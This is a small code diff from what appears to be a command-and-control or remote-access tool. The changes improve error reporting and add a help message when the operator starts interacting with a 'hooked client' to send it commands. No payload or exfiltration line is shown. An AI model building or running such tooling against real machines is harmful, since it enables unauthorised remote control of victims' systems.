@@ -20,14 +20,15 @@ def execute(cmd):
         try: 
             command()
             #print_notification()
-        except:
+        except Exception as e:
+            print_error(e)
             print_error('There is no client connected with that id!')
 
 #what happens when module is run
 def command():
     #interact with a hooked client so we can send commands to it
     conn = connection.connections[args.number-1]
-    print(Fore.LIGHTYELLOW_EX + '[+] Interacting with ' + str(connection.addresses[args.number-1][0]) + Fore.RESET)
+    print(Fore.LIGHTYELLOW_EX + '[+] Interacting with ' + str(connection.addresses[args.number-1][0]) + '. For help use the command \'p-help\'.' + Fore.RESET)
     connection.send_commands(conn, args.number-1)
 
 #just some color coding 
